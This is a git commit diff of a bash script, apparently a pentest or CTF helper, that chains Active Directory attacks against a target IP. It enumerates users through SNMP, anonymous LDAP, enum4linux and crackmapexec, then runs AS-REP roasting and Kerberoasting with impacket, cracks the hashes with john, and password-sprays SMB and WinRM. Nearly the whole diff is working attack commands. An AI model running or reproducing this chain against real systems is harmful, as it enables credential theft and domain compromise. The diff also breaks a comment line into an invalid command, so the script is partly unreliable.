79c79b2ba5a1ab60a3a0f011b2476b8c97fd5037
dirbuster <pralainleopold@gmail.com>
2023-01-07 20:39:32 +0100

    win v3 working

--- wincheck.sh
+++ wincheck.sh
@@ -37,18 +37,18 @@ else
 	echo -e "${RED} please select 1 or 2 for scan ${ENDCOLOR}"
 fi
 
-# Uncomment if you want to check snmp
+Uncomment if you want to check snmp
 
-# check_snmp=$( cat out_map | grep 161 )
-# if [ "$check_snmp" ];then
-# 	echo "Potential listing Users [ ... ]"
-# 	snmp_user=$(snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25)
-# 	if [ -n $snmpwalk ];then
-# 		echo $snmp_user > snmp_users.txt
-# 	fi
-# 	echo "Potential enum for process [ ... ]"
-# 	snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2
-# fi
+check_snmp=$( cat out_map | grep 161 )
+if [ "$check_snmp" ];then
+	echo "Potential listing Users [ ... ]"
+	snmp_user=$(snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25)
+	if [ -n $snmpwalk ];then
+		echo $snmp_user > snmp_users.txt
+	fi
+	echo "Potential enum for process [ ... ]"
+	snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2
+fi
 
 ## Check for domain part with CME / possibility switch with dnsrecon
 
@@ -63,22 +63,25 @@ name=$(echo $domain | cut -d. -f1)
 ext=$(echo $domain | cut -d. -f2)
 
 ## LDAP check for anonymous binding 
-out=$(ldapsearch -x -H ldap://$ip -b 'DC='$name',DC='$ext'')
 
-bind_verif=$(echo $out | grep 'result' | cut -d: -f2 | cut -d ' ' -f3)
-
-if [ "$bind_verif" = "success" ];then
+ldapsearch -x -H ldap://$ip -b 'DC='$name',DC='$ext'' > ldapsearch
+bind_verif=$(cat ldapsearch | grep 'result:' | cut -d: -f2 | cut -d ' ' -f3)
+echo $bind_verif
+if [ "$bind_verif" = "Success" ];then
 	echo -e "${GREEN}[+] Anonymous bind is possible ${ENDCOLOR}"
+	ldapsearch -x -H ldap://$ip -b 'DC='$name',DC='$ext''| grep userPrincipalName:  | cut  -d" " -f2 | cut -d@ -f1  > users.txt
+
 	else
+		rm ldapsearch
 		echo -e "${RED}[-] No succes to bind ldap anonymous  ${ENDCOLOR}"
 fi
 
 # Enum4Linux to check RPC enum for discovering some User's
 
-enum4linux $ip |grep user: | cut -d' ' -f1 | cut -d'[' -f2 | cut -d']' -f1 > users.txt 
+enum4linux $ip |grep user: | cut -d' ' -f1 | cut -d'[' -f2 | cut -d']' -f1 >> users.txt 
 #enum4linux -a -u"" -p"" $ip |grep user: | cut -d' ' -f1 | cut -d'[' -f2 | cut -d']' -f1 >> users.txt 
 #enum4linux -a -u"guest" -p"" $ip |grep user: | cut -d' ' -f1 | cut -d'[' -f2 | cut -d']' -f1 >> users.txt 
-crackmapexec smb $ip --users
+crackmapexec smb $ip --users | grep $domain | cut -d\\ -f2 |cut -d" " -f1 >> users.txt
 
 check_users=$(cat users.txt)
 
@@ -87,10 +90,10 @@ if [ -n "$check_users" ];then
 	echo -e "${GREEN}[+] Users Found with Eum4linux, trying ASP_REQ_ATTACK${ENDCOLOR}"
 
 	#ASP_REQ_ROAST_CHECK 
-	impacket-GetNPUsers.py $domain/ -usersfile users.txt -format hashcat -outputfile hash.asproast
+	impacket-GetNPUsers $domain/ -usersfile users.txt -format hashcat -outputfile hash.asproast
 	confirm=$(ls | grep hash.asproast)
 	if [ "$confirm" = "hash.asproast" ];then
-		echo -e "${GREEN}[+] ASP_REQ_ATTACK Found ... be patient john is cracking the hash  of the user services ${ENDCOLOR}"
+		echo -e "${GREEN}[+] ASP_REQ_ATTACK Found ( check hash ) ... be patient john is cracking the hash  of the user services ${ENDCOLOR}"
 		john hash.asproast --wordlist=/usr/share/wordlists/rockyou.txt
 	else
 		echo -e "${RED}[-] No succes to ASP_REQ_ATTACK  ${ENDCOLOR}"
@@ -104,9 +107,9 @@ if [ -n "$check_users" ];then
 	if [ -n "$passspray" ];then
 		echo -e "${GREEN}[+] Success on password spraying attack with the user $passspray ${ENDCOLOR}"
 
-		echo -e "${BOLDGREEN} TRYING KERBEROAST ATTACK  ... ${ENDCOLOR}"
+		echo -e "${BOLDGREEN} TRYING KERBEROAST ATTACK for user $passspray ... ${ENDCOLOR}"
 
-		impacket-GetUserSPNs.py  -request -dc-ip $ip $domain/$passspray  -outputfile hashes.kerberoast 
+		impacket-GetUserSPNs  -request -dc-ip $ip $domain/$passspray  -outputfile hashes.kerberoast 
 		check_kerberoast=$(ls hashes.kerberoast)
 		if [ -n "$check_kerberoast" ]; then
 				echo -e "${GREEN}[+] User $passspray is kerboastable - trying to crack his password ...${ENDCOLOR}"
@@ -123,9 +126,9 @@ if [ -n "$check_users" ];then
 	crackmapexec smb $ip -u users.txt -p users.txt -M adcs
 	crackmapexec winrm $ip -u users.txt -p users.txt --no-bruteforce --continue-on-succes
 
-else 
-	echo -e "${RED}[-] No users found ${ENDCOLOR}"
-	rm users.txt
+# else 
+# 	echo -e "${RED}[-] Fin ${ENDCOLOR}"
+# 	rm users.txt
 fi
 
 
